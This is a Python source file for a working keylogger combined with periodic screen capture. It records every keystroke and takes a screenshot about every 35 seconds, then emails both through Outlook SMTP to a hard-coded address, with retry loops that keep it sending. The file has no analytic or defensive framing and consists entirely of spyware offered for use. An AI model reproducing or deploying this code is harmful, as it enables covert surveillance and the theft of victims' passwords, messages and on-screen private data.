import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import mss
import keyboard
import time
from threading import Timer
from datetime import datetime
import logging
import threading
import socket
os.chdir(os.path.dirname(os.path.realpath(__file__)))

logging.basicConfig(level=logging.INFO)

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "email@google.com"
EMAIL_PASSWORD = "password"

def is_internet_available():
    try:
        # Attempt to establish a connection to Google's public DNS server
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        return f"keylog-{start_dt_str}_{end_dt_str}"

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            filename = self.update_filename()
            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, f"[{filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()


    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

    @staticmethod
    def send_email(email, password, message):
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "Comp 2 Keylog"
        msg.attach(MIMEText(message, 'plain'))

        with smtplib.SMTP(host="smtp-mail.outlook.com", port=587) as server:
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, msg.as_string())


def capture_and_send_screenshot(email_address, email_password, recipient_email, smtp_server, smtp_port,
                                interval_seconds=35,
                                max_retries=2000000):
    while True:
        while not is_internet_available():
            #print("No internet connection. Retrying...")
            time.sleep(10)  # Wait for 10 seconds before retrying

        retries = 1000000

        while retries < max_retries:
            try:
                with mss.mss() as sct:
                    screenshot_filename = "screenshot.png"
                    sct.shot(output=screenshot_filename)

                    msg = MIMEMultipart()
                    msg['From'] = email_address
                    msg['To'] = recipient_email
                    msg['Subject'] = 'comp 2 ss log'

                    with open(screenshot_filename, 'rb') as screenshot_file:
                        image_attachment = MIMEImage(screenshot_file.read(), 'png', name='screenshot.png')
                    msg.attach(image_attachment)

                    with smtplib.SMTP(smtp_server, smtp_port) as server:
                        server.starttls()
                        server.login(email_address, email_password)
                        server.sendmail(email_address, recipient_email, msg.as_string())

                    logging.info("Screenshot sent successfully.")

                    try:
                        os.remove(screenshot_filename)
                    except FileNotFoundError:
                        pass

                    break

            except FileNotFoundError:
                logging.warning("Screenshot file not found. Retaking screenshot.")

            except Exception as e:
                logging.error(f"An unexpected error occurred: {e}")

            retries += 1
            time.sleep(interval_seconds)

        if retries == max_retries:
            logging.error(f"Failed to send screenshot after {max_retries} retries.")

        time.sleep(interval_seconds)

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)

    # Start keylogger and screenshot capture in separate threads
    keylogger_thread = threading.Thread(target=keylogger.start)
    screenshot_thread = threading.Thread(
        target=capture_and_send_screenshot,
        args=(EMAIL_ADDRESS, EMAIL_PASSWORD, EMAIL_ADDRESS, "smtp-mail.outlook.com", 587)
    )

    keylogger_thread.start()
    screenshot_thread.start()
